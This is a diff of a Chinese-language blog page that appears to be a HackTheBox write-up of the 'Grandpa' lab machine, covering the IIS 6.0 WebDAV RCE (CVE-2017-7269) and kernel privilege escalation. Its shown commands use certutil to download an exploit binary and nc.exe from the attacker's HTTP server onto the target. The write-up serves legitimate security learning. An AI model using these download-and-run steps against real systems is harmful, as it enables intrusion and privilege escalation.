@@ -20,12 +20,12 @@
   <title>HTB: Grandpa - T0x1c</title>
 
   
-    <meta name="description" content="Grandpa是一个简单的靶机，知识点涉及WebDav RCE漏洞、ms14-070内核提权以及ms09-020内核提权等。相比于Granny中的文件上传，CVE-2017-7269可以直接通过缓冲区溢出来获取权限。而使用msf渗透框架的利用脚本可以快速获取权限。感兴趣的同学可以在HackTheBox中进行学习。">
+    <meta name="description" content="Grandpa是一个简单的靶机，知识点涉及WebDav RCE漏洞、ms14-070内核提权以及ms09-020内核提权等。IIS 6.0存在远程代码执行漏洞（CVE-2017-7269），该漏洞通过缓冲区溢出成功获取用户权限。在靶机中存在多个内核漏洞，使用ms14-070等漏洞可获取系统权限。感兴趣的同学可以在HackTheBox中进行学习。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HTB: Grandpa">
 <meta property="og:url" content="https://toxic80l.github.io/post/bf422474/index.html">
 <meta property="og:site_name" content="T0x1c">
-<meta property="og:description" content="Grandpa是一个简单的靶机，知识点涉及WebDav RCE漏洞、ms14-070内核提权以及ms09-020内核提权等。相比于Granny中的文件上传，CVE-2017-7269可以直接通过缓冲区溢出来获取权限。而使用msf渗透框架的利用脚本可以快速获取权限。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:description" content="Grandpa是一个简单的靶机，知识点涉及WebDav RCE漏洞、ms14-070内核提权以及ms09-020内核提权等。IIS 6.0存在远程代码执行漏洞（CVE-2017-7269），该漏洞通过缓冲区溢出成功获取用户权限。在靶机中存在多个内核漏洞，使用ms14-070等漏洞可获取系统权限。感兴趣的同学可以在HackTheBox中进行学习。">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0110.gif">
 <meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8A%E5%8D%8810.46.29.png">
@@ -49,10 +49,11 @@
 <meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%883.34.09.png">
 <meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%883.42.06.png">
 <meta property="article:published_time" content="2022-01-13T05:33:34.000Z">
-<meta property="article:modified_time" content="2022-02-21T01:46:28.976Z">
+<meta property="article:modified_time" content="2022-02-23T08:39:33.107Z">
 <meta property="article:author" content="toxic80L">
 <meta property="article:tag" content="靶机">
 <meta property="article:tag" content="Windows">
+<meta property="article:tag" content="IIS">
 <meta property="article:tag" content="WebDav">
 <meta property="article:tag" content="ms14-070">
 <meta property="article:tag" content="ms09-020">
@@ -109,7 +110,7 @@
 
 <article class='content md post'>
 <h1 class="article-title"><span>HTB: Grandpa</span></h1>
-<p>Grandpa是一个简单的靶机，知识点涉及WebDav RCE漏洞、ms14-070内核提权以及ms09-020内核提权等。相比于Granny中的文件上传，CVE-2017-7269可以直接通过缓冲区溢出来获取权限。而使用msf渗透框架的利用脚本可以快速获取权限。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<p>Grandpa是一个简单的靶机，知识点涉及WebDav RCE漏洞、ms14-070内核提权以及ms09-020内核提权等。IIS 6.0存在远程代码执行漏洞（CVE-2017-7269），该漏洞通过缓冲区溢出成功获取用户权限。在靶机中存在多个内核漏洞，使用ms14-070等漏洞可获取系统权限。感兴趣的同学可以在HackTheBox中进行学习。</p>
 <span id="more"></span>
 <span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0110.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8A%E5%8D%8810.46.29.png" alt="截屏2021-10-13 上午10.46.29"></p>
@@ -133,7 +134,7 @@
 <h2 id="0x03-权限提升-system"><a href="#0x03-权限提升-system" class="headerlink" title="0x03 权限提升[system]"></a>0x03 权限提升[system]</h2><h3 id="查询内核漏洞"><a href="#查询内核漏洞" class="headerlink" title="查询内核漏洞"></a>查询内核漏洞</h3><p>获取系统信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.10.00.png" alt="截屏2021-10-13 下午2.10.00"><br>目标系统为 windows 2003，使用 Windows-Exploit-Suggester 查找相关漏洞</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --database 2021-05-18-mssb.xls  --systeminfo systeminfo.txt</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.12.15.png" alt="截屏2021-10-13 下午2.12.15"><br>选择 ms09-020 进行提权，其中 IIS6.0.exe 就是漏洞利用程序</p>
-<h3 id="手工内核提权"><a href="#手工内核提权" class="headerlink" title="手工内核提权"></a>手工内核提权</h3><p>首先本地开启http服务，用于传输 IIS6.0.exe 和 nc.exe</p>
+<h3 id="手工内核提权"><a href="#手工内核提权" class="headerlink" title="手工内核提权"></a>手工内核提权</h3><p>首先本地开启http服务，用于传输 IIS 6.0.exe 和 nc.exe</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/windows-resources/binaries/nc.exe .</span><br><span class="line">ls</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.22.24.png" alt="截屏2021-10-13 下午2.22.24"><br>在靶机中通过命令传输 IIS6.0.exe 和 nc.exe</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f <span class="string">&quot;http://10.10.14.5/IIS6.0.exe&quot;</span> IIS6.0.exe </span><br><span class="line">certutil -urlcache -split -f <span class="string">&quot;http://10.10.14.5/nc.exe&quot;</span> nc.exe </span><br></pre></td></tr></table></figure>
